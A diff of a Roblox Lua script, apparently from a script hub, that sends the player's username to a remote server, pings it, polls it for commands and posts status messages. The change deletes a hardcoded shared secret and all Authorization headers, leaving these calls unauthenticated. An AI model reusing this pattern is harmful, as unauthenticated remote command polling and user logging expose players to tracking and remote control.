@@ -6,7 +6,6 @@ task.spawn(function()
     
     -- ВАЖНО: Вставь сюда свою ссылку из Render!
     local SERVER_URL = "https://tumbahub-server.onrender.com/api/log_user" 
-    local SHARED_SECRET = "my_secure_secret_123" -- Должен совпадать с SHARED_SECRET на сервере
 
     local userData = {
         username = LocalPlayer.Name,
@@ -22,8 +21,7 @@ task.spawn(function()
                 Url = SERVER_URL,
                 Method = "POST",
                 Headers = {
-                    ["Content-Type"] = "application/json",
-                    ["Authorization"] = SHARED_SECRET
+                    ["Content-Type"] = "application/json"
                 },
                 Body = HttpService:JSONEncode(userData)
             })
@@ -37,10 +35,7 @@ task.spawn(function()
                     local safeUsername = HttpService:UrlEncode(LocalPlayer.Name)
                     requestFunc({
                         Url = "https://tumbahub-server.onrender.com/api/ping?username=" .. safeUsername,
-                        Method = "GET",
-                        Headers = {
-                            ["Authorization"] = SHARED_SECRET
-                        }
+                        Method = "GET"
                     })
                 end)
             end
@@ -53,10 +48,7 @@ task.spawn(function()
                 local safeUsername = HttpService:UrlEncode(LocalPlayer.Name)
                 return requestFunc({
                     Url = "https://tumbahub-server.onrender.com/api/get_command?username=" .. safeUsername,
-                    Method = "GET",
-                    Headers = {
-                        ["Authorization"] = SHARED_SECRET
-                    }
+                    Method = "GET"
                 })
             end)
 
@@ -104,10 +96,7 @@ task.spawn(function()
                         pcall(requestFunc, {
                             Url = "https://tumbahub-server.onrender.com/api/send_message",
                             Method = "POST",
-                            Headers = { 
-                                ["Content-Type"] = "application/json",
-                                ["Authorization"] = SHARED_SECRET
-                            },
+                            Headers = { ["Content-Type"] = "application/json" },
                             Body = HttpService:JSONEncode({ text = statusText })
                         })
                         
